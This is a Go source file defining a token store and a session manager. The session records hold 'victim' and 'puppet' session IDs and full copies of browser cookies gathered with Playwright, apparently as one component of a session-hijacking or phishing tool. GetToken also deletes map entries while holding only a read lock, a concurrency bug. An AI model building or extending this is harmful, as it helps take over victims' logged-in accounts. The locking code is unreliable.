package core

import (
	"sync"
	"time"

	"github.com/playwright-community/playwright-go"
)

// TokenStore manages tokens for sessions
type TokenStore struct {
	tokens map[string]*TokenEntry
	mu     sync.RWMutex
}

// TokenEntry represents a stored token
type TokenEntry struct {
	Value     string
	CreatedAt time.Time
	ExpiresAt time.Time
	SessionID string
	TokenName string
}

// NewTokenStore creates a new token store
func NewTokenStore() *TokenStore {
	return &TokenStore{
		tokens: make(map[string]*TokenEntry),
	}
}

// SetToken stores a token
func (ts *TokenStore) SetToken(key, value string) {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	
	ts.tokens[key] = &TokenEntry{
		Value:     value,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(5 * time.Minute), // Tokens expire in 5 minutes
	}
}

// GetToken retrieves a token
func (ts *TokenStore) GetToken(key string) (string, bool) {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	
	entry, exists := ts.tokens[key]
	if !exists {
		return "", false
	}
	
	// Check if expired
	if time.Now().After(entry.ExpiresAt) {
		delete(ts.tokens, key)
		return "", false
	}
	
	return entry.Value, true
}

// CleanupExpired removes expired tokens
func (ts *TokenStore) CleanupExpired() {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	
	now := time.Now()
	for key, entry := range ts.tokens {
		if now.After(entry.ExpiresAt) {
			delete(ts.tokens, key)
		}
	}
}

// SessionManager manages sessions
type SessionManager struct {
	sessions map[string]*SessionData
	mu       sync.RWMutex
}

// SessionData contains session information
type SessionData struct {
	VictimSessionID string
	PuppetSessionID string
	Cookies         []map[string]interface{}
	Tokens          map[string]string
	CreatedAt       time.Time
}

// NewSessionManager creates a new session manager
func NewSessionManager() *SessionManager {
	return &SessionManager{
		sessions: make(map[string]*SessionData),
	}
}

// SetCookies stores cookies for a session
func (sm *SessionManager) SetCookies(sessionID string, cookies []playwright.Cookie) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	
	if _, exists := sm.sessions[sessionID]; !exists {
		sm.sessions[sessionID] = &SessionData{
			VictimSessionID: sessionID,
			Tokens:          make(map[string]string),
			CreatedAt:       time.Now(),
		}
	}
	
	var cookieList []map[string]interface{}
	for _, cookie := range cookies {
		cookieList = append(cookieList, map[string]interface{}{
			"name":     cookie.Name,
			"value":    cookie.Value,
			"domain":   cookie.Domain,
			"path":     cookie.Path,
			"expires":  cookie.Expires,
			"httpOnly": cookie.HttpOnly,
			"secure":   cookie.Secure,
			"sameSite": cookie.SameSite,
		})
	}
	
	sm.sessions[sessionID].Cookies = cookieList
}

// GetCookies retrieves cookies for a session
func (sm *SessionManager) GetCookies(sessionID string) []map[string]interface{} {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	
	if session, exists := sm.sessions[sessionID]; exists {
		return session.Cookies
	}
	
	return nil
}